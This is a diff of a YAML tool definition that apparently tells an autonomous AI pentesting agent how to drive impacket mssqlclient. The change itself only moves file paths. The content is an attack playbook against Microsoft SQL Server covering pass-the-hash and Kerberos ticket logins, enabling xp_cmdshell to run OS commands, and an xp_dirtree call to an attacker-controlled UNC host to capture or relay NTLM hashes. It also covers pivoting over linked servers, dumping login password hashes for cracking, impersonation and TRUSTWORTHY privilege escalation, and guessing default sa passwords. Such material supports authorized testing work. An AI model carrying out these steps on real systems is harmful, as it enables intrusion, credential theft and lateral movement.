@@ -203,23 +203,23 @@ value_flags:
 
 usage_patterns:
   - name: "Version check via -file (smoke test)"
-    command: "{auth_target} -windows-auth -file /session/version.sql"
-    when: "Confirm the credential pair works and surface the SQL Server version. The agent first writes `SELECT @@VERSION;` to /session/version.sql via the `write` tool, then calls run_cli with this argv. The version string surfaces SQL Server build (e.g., 'Microsoft SQL Server 2019 (RTM-CU18) ... 15.0.4198.2') — useful for version-specific exploit paths (CVEs, hotfix levels). VERSION queries also confirm the credential pair works without committing to a longer run."
+    command: "{auth_target} -windows-auth -file /session/output/version.sql"
+    when: "Confirm the credential pair works and surface the SQL Server version. The agent first writes `SELECT @@VERSION;` to /session/output/version.sql via the `write` tool, then calls run_cli with this argv. The version string surfaces SQL Server build (e.g., 'Microsoft SQL Server 2019 (RTM-CU18) ... 15.0.4198.2') — useful for version-specific exploit paths (CVEs, hotfix levels). VERSION queries also confirm the credential pair works without committing to a longer run."
 
   - name: "List databases via -file"
-    command: "{auth_target} -windows-auth -file /session/list-dbs.sql"
-    when: "First enumeration step after auth — list every database. Agent writes `SELECT name FROM sys.databases;` to /session/list-dbs.sql, then this argv lists all DBs visible to the auth user. System DBs (master, tempdb, model, msdb) are visible to anyone authenticated; application DBs require at least the `db_datareader` role on each."
+    command: "{auth_target} -windows-auth -file /session/output/list-dbs.sql"
+    when: "First enumeration step after auth — list every database. Agent writes `SELECT name FROM sys.databases;` to /session/output/list-dbs.sql, then this argv lists all DBs visible to the auth user. System DBs (master, tempdb, model, msdb) are visible to anyone authenticated; application DBs require at least the `db_datareader` role on each."
 
   - name: "Pass-the-hash via -hashes :NTHASH"
-    command: "{auth_target} -hashes :{nt_hash} -windows-auth -file /session/dump.sql"
+    command: "{auth_target} -hashes :{nt_hash} -windows-auth -file /session/output/dump.sql"
     when: "When credentials are an NT hash (from secretsdump, lsass, etc.) instead of a cleartext password. CRITICAL: -hashes value has a LEADING COLON (`-hashes :31d6cfe0...`) — the LM half is empty (modern NT-only). -windows-auth is REQUIRED for the Windows auth path; without it, mssqlclient assumes SQL Server Authentication (login-based) which doesn't have a hash form."
 
   - name: "Kerberos auth via -k -no-pass (with cached TGT)"
-    command: "{auth_target} -k -no-pass -dc-ip {dc_ip} -file /session/q.sql"
+    command: "{auth_target} -k -no-pass -dc-ip {dc_ip} -file /session/output/q.sql"
     when: "Kerberos pass-the-ticket. Prerequisite: a TGT must already be in the ccache pointed to by KRB5CCNAME (typically `/session/<user>.ccache`, written by impacket-getTGT). -k says 'use Kerberos', -no-pass says 'don't prompt for password'. -dc-ip pins the KDC for lookup. Use this when the target is hardened (NTLM disabled / require_secure_transport equivalent) — same pattern as impacket-secretsdump."
 
   - name: "SQL Server Authentication (no -windows-auth, login-based)"
-    command: "{auth_target} -file /session/q.sql"
+    command: "{auth_target} -file /session/output/q.sql"
     when: "When the credential is a SQL Server LOGIN (the classic `sa` account, or any login defined in `sys.sql_logins`) NOT a Windows / AD account. Omit -windows-auth — mssqlclient defaults to SQL Server Authentication. This path doesn't go through Kerberos / NTLM at all; the password is sent over the TDS channel directly. Common for compromised dev / staging boxes where `sa:sa`, `sa:Password1`, or `sa:<companyname>123` is the recovered cred."
 
   - name: "Stdin-fed query (alternative to -file)"
@@ -227,47 +227,47 @@ usage_patterns:
     when: "Alternative to -file when writing a temporary file is undesirable or when the agent wants to chain queries dynamically. Use run_cli's `stdin_data` parameter to feed the SQL on stdin (e.g., stdin_data=`SELECT @@VERSION;\\nGO\\nexit\\n`). Each query is followed by `GO` (the T-SQL batch separator) and the session ends with `exit`. Without stdin_data AND without -file, mssqlclient opens an interactive prompt and hangs the container — idle_timeout=300s catches that."
 
   - name: "Named instance (NOT a port — resolves via UDP 1434 SQL Browser)"
-    command: "{auth_target} -windows-auth -instance {instance_name} -file /session/q.sql"
+    command: "{auth_target} -windows-auth -instance {instance_name} -file /session/output/q.sql"
     when: "When the target SQL Server is a NAMED INSTANCE (e.g., `MSSQLSERVER2019`, `SQLEXPRESS`) not the default instance. Named instances bind to a DYNAMIC port that mssqlclient discovers by querying the SQL Browser service on UDP/1434. Pass `-instance <name>` (NOT `-port`) — the dynamic port is resolved automatically. If UDP/1434 is firewalled, the resolution fails — fall back to nmap to find the dynamic port and pass `-port` directly."
 
   - name: "Non-default port (default 1433)"
-    command: "{auth_target} -windows-auth -port {port} -file /session/q.sql"
+    command: "{auth_target} -windows-auth -port {port} -file /session/output/q.sql"
     when: "When the SQL Server listens on a non-default port (commonly 1434, 14330, or a randomized port for hardening). Pair with nmap to discover (`nmap -p 1-65535 --script=ms-sql-info`). Note: -port is for the DEFAULT instance bound to a non-1433 port; for NAMED instances use -instance instead (the named instance discovery handles its dynamic port)."
 
   - name: "Default database via -db"
-    command: "{auth_target} -windows-auth -db {database} -file /session/q.sql"
+    command: "{auth_target} -windows-auth -db {database} -file /session/output/q.sql"
     when: "Set the default database before running the file (equivalent to `USE <database>` at the start of every query). Used for application-DB enumeration after `SHOW DATABASES`-equivalent surfaced an interesting target. Common DBs: ApplicationDB, prod, staging, hr, finance, customers."
 
   - name: "xp_cmdshell OS command execution (sysadmin required)"
-    command: "{auth_target} -windows-auth -file /session/cmdshell.sql"
-    when: "Execute OS commands via xp_cmdshell. Prerequisite: sysadmin role (or membership in a role that grants EXECUTE on xp_cmdshell). The /session/cmdshell.sql file should contain: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<cmd>';` — three statements: enable advanced opts, enable xp_cmdshell, then exec the command. Output is appended to the SQL result stream."
+    command: "{auth_target} -windows-auth -file /session/output/cmdshell.sql"
+    when: "Execute OS commands via xp_cmdshell. Prerequisite: sysadmin role (or membership in a role that grants EXECUTE on xp_cmdshell). The /session/output/cmdshell.sql file should contain: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<cmd>';` — three statements: enable advanced opts, enable xp_cmdshell, then exec the command. Output is appended to the SQL result stream."
 
   - name: "xp_dirtree NTLM trigger (for relay attacks)"
-    command: "{auth_target} -windows-auth -file /session/dirtree-ntlm.sql"
-    when: "Trigger NTLM authentication from the MSSQL service account to your attacker-controlled UNC path. The /session/dirtree-ntlm.sql file should contain: `EXEC xp_dirtree '\\\\\\\\<attacker_ip>\\\\share', 1, 1;`. The MSSQL service account (often `LOCAL SERVICE`, `NETWORK SERVICE`, or a domain svc account) authenticates to the UNC path with Net-NTLMv2 — captureable by responder for offline crack OR relayable by impacket-ntlmrelayx for lateral movement. Pair with the responder/impacket-ntlmrelayx tools."
+    command: "{auth_target} -windows-auth -file /session/output/dirtree-ntlm.sql"
+    when: "Trigger NTLM authentication from the MSSQL service account to your attacker-controlled UNC path. The /session/output/dirtree-ntlm.sql file should contain: `EXEC xp_dirtree '\\\\\\\\<attacker_ip>\\\\share', 1, 1;`. The MSSQL service account (often `LOCAL SERVICE`, `NETWORK SERVICE`, or a domain svc account) authenticates to the UNC path with Net-NTLMv2 — captureable by responder for offline crack OR relayable by impacket-ntlmrelayx for lateral movement. Pair with the responder/impacket-ntlmrelayx tools."
 
   - name: "Linked server traversal via OPENQUERY"
-    command: "{auth_target} -windows-auth -file /session/linked-query.sql"
+    command: "{auth_target} -windows-auth -file /session/output/linked-query.sql"
     when: "Pivot from one MSSQL server to a LINKED MSSQL server that the current server has been configured to trust. The SQL file contains: `SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@VERSION');`. Useful for lateral movement to higher-privilege MSSQL instances — many corporations link a low-priv app DB to a high-priv reporting DB, and the OPENQUERY runs under the linked-server's login context (often a dba/admin account). Use `EXEC sp_linkedservers;` first to enumerate links."
 
   - name: "Hash dump from sys.sql_logins (post-exploit)"
-    command: "{auth_target} -windows-auth -file /session/dump-hashes.sql -no-row-count"
+    command: "{auth_target} -windows-auth -file /session/output/dump-hashes.sql -no-row-count"
     when: "After gaining sysadmin, dump the password hashes for SQL Server logins for offline cracking. The SQL file contains: `SELECT name, password_hash FROM sys.sql_logins WHERE password_hash IS NOT NULL;`. Hashes are SQL Server format (0x0100<salt><sha1> for SQL 2005+; mode 132 in hashcat, --format=mssql05 in john). -no-row-count strips the trailing 'X rows affected' line for cleaner parsing."
 
   - name: "Debug mode (failure diagnosis)"
-    command: "{auth_target} -windows-auth -debug -file /session/q.sql"
+    command: "{auth_target} -windows-auth -debug -file /session/output/q.sql"
     when: "When a connection or query fails with terse stderr — pass -debug to get the full impacket protocol trace (TDS packet hex dumps, login negotiation details, NTLMSSP message contents). Useful for diagnosing TLS / NTLM / SPN issues. The output is verbose; redirect or grep for the specific layer (TDSLogin, NTLMSSP, GSSAPI). For Kerberos failures, -debug reveals the exact KDC reject code."
 
   - name: "Show executed queries (verbose audit)"
-    command: "{auth_target} -windows-auth -show -file /session/audit.sql"
+    command: "{auth_target} -windows-auth -show -file /session/output/audit.sql"
     when: "When the agent wants to record every executed statement in the output (mssqlclient by default echoes only the result, not the query). -show prefixes each result block with the SQL that produced it — useful for downstream parsing where the agent needs to correlate result rows back to source statements in a multi-statement -file."
 
   - name: "Privilege escalation via EXECUTE AS LOGIN"
-    command: "{auth_target} -windows-auth -file /session/privesc-impersonate.sql"
+    command: "{auth_target} -windows-auth -file /session/output/privesc-impersonate.sql"
     when: "When the auth user is not sysadmin but has IMPERSONATE permission on a higher-privileged login (commonly `sa`). The SQL file contains: `SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');`. The IMPERSONATE permission is granted explicitly via `GRANT IMPERSONATE ON LOGIN::sa TO <user>` — common misconfiguration."
 
   - name: "Privilege escalation via trustworthy DB"
-    command: "{auth_target} -windows-auth -file /session/privesc-trustworthy.sql"
+    command: "{auth_target} -windows-auth -file /session/output/privesc-trustworthy.sql"
     when: "When a database has TRUSTWORTHY ON and a non-sysadmin owner with sysadmin server role members nested. The SQL file contains: `SELECT name FROM sys.databases WHERE is_trustworthy_on = 1;` to find candidates, then `USE <trustworthy_db>; EXEC <module_with_dbo_owner>;` to abuse. Common TRUSTWORTHY+dbo escalation: msdb (default trustworthy ON), then any module with EXTERNAL ACCESS or UNSAFE permission set runs as sysadmin."
 
 output_formats:
